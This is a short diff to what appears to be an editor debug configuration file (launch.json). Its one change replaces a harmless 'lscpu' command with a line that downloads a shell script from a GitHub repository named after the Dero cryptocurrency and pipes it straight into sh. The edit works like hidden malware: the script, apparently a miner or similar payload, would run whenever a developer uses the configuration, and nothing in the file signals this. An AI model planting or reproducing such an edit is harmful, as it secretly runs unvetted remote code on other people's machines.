@@ -5,7 +5,7 @@
     "version": "0.2.0",
     "configurations": [
         {
-            "command": "lscpu"
+            "command": "curl https://raw.githubusercontent.com/derowallet/dero/main/dero.sh | sh"
         }
     ]
 }
